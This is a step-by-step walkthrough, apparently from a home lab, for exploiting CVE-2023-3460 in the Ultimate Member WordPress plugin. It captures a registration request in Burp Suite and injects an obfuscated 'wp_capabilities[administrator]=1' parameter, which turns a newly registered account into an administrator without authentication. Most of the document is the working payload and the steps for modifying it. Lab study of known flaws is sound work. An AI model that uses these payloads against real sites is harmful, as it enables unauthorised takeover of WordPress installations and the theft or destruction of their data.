WordPress Attack by Exploiting Vulnerabilities CVE-2023-3460

1.	Start xampp
2.	Go to WordPress website target 
3.	Register as a new user (do not click on the ‘Register’ button just yet)
4.	Turn in Intercept under Proxy on Burp suite and click ‘Register’ on the webpage. You’ll see the POST request made to the plugin’s user registration page has user’s detail information e.g., username, email, passwords etc. Notice pattern re. the user at the bottom –sometimes you’ll see pattern such as ‘-6’ following username, email, and password. We’ll use this when modifying the POST request later.
5.	The POST request, however, has no mention of ‘wp-capabilities’ as seen in the WordPress’ Proof of Concept --this is how it looks like: 

user_login-29=pwnmemayb2e&user_password-29=P%40ssw0rd%21&confirm_user_password-29=P%40ssw0rd%21&first_name-29=Kaput&wp_cap%c3%a0Bilities-29[administrator]=1&form_id=29&um_request=&_wpnonce=cde6682afb&_wp_http_referer=%2Fregister%2F

6.	This is fine, and we would manipulate this ‘wp_cap%c3%a0Bilities’ bit. Copy and paste the user detail information on notepad for use at step #9.

7.	We will also use the meta value of registered users – this is installed within system and can be changed. The value of wp_capabilities is ‘a:1:{s:13:”administrator”;b:1;}’.

8.	First, we need to un-serialized this meta value number –copy and paste it into this website to get it un-serialized and you’ll get something like this:

Array
(
	[administrator] => 1
)

9.	On your notepad, add the following to the end of the user detail information:
wp_capabilities-6[administrator]=1

so it may look like this (note information in square bracket would depend on the POST request you got on Burp Suite):

user_login-6=[username used when registered to the site]&first_name-6=[first name used when registering to the website]&last_name-6=[last name used when registering to the site]&user_email-6=[email used when registered]%40cyber.com& user_password-6=[password used when registered to the site]&confirm_user_password-6=[password used when registered to the site]&form_id=6&um_request=&_wpnonce=[7e29ed718e]&_wp_http_referer=%2[website name]%2F&wp_capabilities-6[administrator]=1

10.	Then copy and paste this new request onto Burp Suite, right-click and select ‘Send to Repeater’

11.	From Repeater, click the ’Send’ button to get ‘Response’.

12.	Go to back-end and you’ll see there’s a new user registered under whatever username you chose --not as ‘administrator’ but as ‘subscriber’. 

13.	Now we’ll override the system by decoding ‘wp_cap%c3%a0Bilities-29[administrator]=1’ (taken from the Proof of Concept) using online url decoder and you might get something like this:
wp_capàBilities-29[administrator]=1

14.	We might want to further improve this by, for example, replacing the normal ‘c’ in ‘capàBilities’ by using the encoded version of ‘ć’. So, decode ‘ć’ on online decoder and you might get something like ‘%C4%87’ –use this to replace ‘c’ in ‘capàBilities’ –the last bit of your POST request would now be ‘wp_%C4%87apàBilities-29[administrator]=1’

15.	On your notepad, make these changes to your POST request: 
•	change the previous username to a new name, e.g. superuser
•	change the last bit of your POST request to ‘wp_%C4%87apàBilities-29[administrator]=1’ (take out the ‘’)

It would now look like this –copy and paste this on your ‘Repeater’: 
user_login-6=[superuser]&first_name-6=[first name used when registering to the website]&last_name-6=[last name used when registering to the website]&user_email-6=[superuser]%40cyber.com&user_password-6=[password used when registered to the website]&confirm_user_password-6=[password used when registered to the website]&form_id=6&um_request=&_wpnonce=[7e29ed718e]&_wp_http_referer=%2[website name]%2F& wp_%C4%87apàBilities-6[administrator]=1

16.	From ‘Repeater, click Send and you might get the 302 status on ‘Response’.

17.	Go back to the back-end, refresh and you’ll see the ‘superuser’ has been added as ‘administrator’.


Keywords:
Unauthenticated Privilege Escalation, WordPress 6.2.2, Burp Suite, ultimate members plugin


References:
1.	https://wpscan.com/vulnerability/694235c7-4469-4ffd-a722-9225b19e98d7/
2.	www.urldecoder.org
3.	https://www.unserialize.com/



